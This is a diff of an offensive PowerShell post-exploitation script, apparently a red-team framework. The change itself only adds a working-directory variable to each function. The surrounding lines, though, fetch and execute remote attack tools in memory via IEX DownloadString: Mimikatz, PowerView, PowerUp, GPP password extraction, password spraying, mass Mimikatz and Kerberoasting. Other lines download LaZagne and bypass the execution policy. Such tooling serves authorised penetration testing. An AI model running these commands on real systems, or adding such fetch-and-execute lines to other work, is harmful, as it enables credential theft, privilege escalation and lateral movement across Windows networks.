@@ -151,6 +151,7 @@ function sessionGopher {
         Author: @securethisshit
         License: BSD 3-Clause
     #>
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
     $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
     if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
@@ -191,7 +192,7 @@ function Mimikatzlocal {
         Author: @securethisshit
         License: BSD 3-Clause
     #>
-    
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if (isadmin)
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
@@ -234,6 +235,7 @@ function localreconmodules
         License: BSD 3-Clause
     #>
             #Local Reconning
+            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 
@@ -286,6 +288,7 @@ function jaws
         License: BSD 3-Clause
     #>
             #Local Recon / Privesc
+            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
             Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
@@ -301,6 +304,7 @@ function domainreconmodules
         License: BSD 3-Clause
     #>
             #Domain / Network Reconing
+            $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
             $domain_Name = Get-NetDomain
@@ -359,6 +363,7 @@ function privescmodules
         License: BSD 3-Clause
     #>
     #Privilege Escalation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
@@ -396,6 +401,7 @@ function lazagnemodule
         License: BSD 3-Clause
     #>
     #Privilege Escalation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip' -Outfile $currentPath\Lazagne.zip
     Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
     Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
@@ -418,6 +424,7 @@ function latmov
         License: BSD 3-Clause
     #>
     #Lateral Movement Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
@@ -470,6 +477,7 @@ function latmov
 
 function empirelauncher
 {
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-WmiCommand.ps1')
     #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1') maybe an alternative later on.
     if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
@@ -528,6 +536,7 @@ function shareenumeration
         License: BSD 3-Clause
     #>
     #Enumeration Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
     Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
     Invoke-FileFinder >> $currentPath\SensitiveFiles.txt
@@ -543,6 +552,7 @@ function groupsearch
         License: BSD 3-Clause
     #>
     #Enumeration Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
@@ -570,6 +580,7 @@ function proxydetect
         License: BSD 3-Clause
     #>    
     #Proxy Detect #1
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     Write-Host -ForegroundColor Yellow 'Searching for network proxy...'
 
     $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
@@ -600,6 +611,7 @@ function proxydetect
 function kerberoasting
 {
     #Exploitation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
     Write-Host -ForegroundColor Red 'Kerberoasting active:'
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
